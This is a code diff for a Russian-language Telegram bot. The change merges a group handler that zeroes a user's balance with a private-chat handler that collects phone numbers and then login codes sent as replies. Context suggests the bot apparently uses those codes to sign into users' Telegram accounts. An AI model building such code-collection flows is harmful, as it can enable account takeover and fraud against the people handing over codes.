@@ -452,36 +452,47 @@ async def code_timeout(user_id: int, phone: str):
         except Exception:
             pass
 
-# === Обработчик ввода ID для чистки баланса ===
-@dp.message(F.text.regexp(r"^\d+$"))
-async def balance_clear_handler(msg: Message):
-    if not await is_approved_group(msg):
+# === Единый обработчик сообщений ===
+
+@dp.message()
+async def main_handler(msg: Message):
+    # СЛУЧАЙ 1: Команды — пропускаем
+    if msg.text and msg.text.startswith("/"):
         return
 
-    if msg.chat.id not in expecting_balance_clear:
-        return
+    # СЛУЧАЙ 2: Группа ждёт ID для чистки баланса
+    if msg.chat.type in ("group", "supergroup") and msg.chat.id in expecting_balance_clear:
+        if msg.text and msg.text.isdigit():
+            user_id = int(msg.text.strip())
+            expecting_balance_clear.discard(msg.chat.id)
+            async with db_pool.acquire() as conn:
+                await conn.execute("UPDATE users SET balance = 0 WHERE user_id = $1", user_id)
+            await msg.answer(f"✅ Баланс пользователя {user_id} очищен")
+            return
 
-    user_id = int(msg.text.strip())
-    expecting_balance_clear.discard(msg.chat.id)
-
-    async with db_pool.acquire() as conn:
-        await conn.execute("UPDATE users SET balance = 0 WHERE user_id = $1", user_id)
-
-    await msg.answer(f"✅ Баланс пользователя {user_id} очищен")
-
-# === Обработчик номера телефона ===
-
-@dp.message(F.text, ~F.text.startswith("/"))
-async def phone_handler(msg: Message):
+    # СЛУЧАЙ 3: Группа — больше ничего не обрабатываем
     if msg.chat.type in ("group", "supergroup"):
         return
 
-    raw = msg.text.strip()
+    # СЛУЧАЙ 4: Код ответом на инструкцию
+    if msg.from_user.id in waiting_code and msg.reply_to_message and msg.reply_to_message.from_user.id == bot.id:
+        return await code_as_reply(msg)
+
+    # СЛУЧАЙ 5: Ждём код, но не ответом — ошибка
+    if msg.from_user.id in waiting_code:
+        return await msg.answer(
+            "❌ Неверный формат ввода. Пожалуйста, введите код ответом на сообщение бота с инструкцией"
+        )
+
+    # СЛУЧАЙ 6: Не в режиме ожидания номера
+    if msg.from_user.id not in expecting_phone:
+        return
+
+    # СЛУЧАЙ 7: Обработка номера телефона
+    raw = msg.text.strip() if msg.text else ""
     digits = "".join(c for c in raw if c.isdigit())
 
-    is_phone = len(digits) in (10, 11) and (digits.startswith("7") or digits.startswith("8"))
-
-    if is_phone and msg.from_user.id in expecting_phone:
+    if len(digits) in (10, 11) and (digits.startswith("7") or digits.startswith("8")):
         if len(digits) == 11 and digits.startswith("7"):
             phone = "+" + digits
         elif len(digits) == 11 and digits.startswith("8"):
@@ -519,17 +530,9 @@ async def phone_handler(msg: Message):
         asyncio.create_task(code_timeout(msg.from_user.id, phone))
         return
 
-    if msg.from_user.id in waiting_code:
-        if msg.reply_to_message and msg.reply_to_message.from_user.id == bot.id:
-            return await code_as_reply(msg)
-        return await msg.answer(
-            "❌ Неверный формат ввода. Пожалуйста, введите код ответом на сообщение бота с инструкцией"
-        )
-
-    if msg.from_user.id not in expecting_phone:
-        return
-
-    await msg.answer("❌ Не удалось распознать номер. Отправьте в формате +79161234567")
+    # СЛУЧАЙ 8: Не удалось распознать
+    if msg.text:
+        await msg.answer("❌ Не удалось распознать номер. Отправьте в формате +79161234567")
 
 async def run_client(msg: Message, client: Client, phone: str, sms_provider: TelegramSmsProvider):
     try:
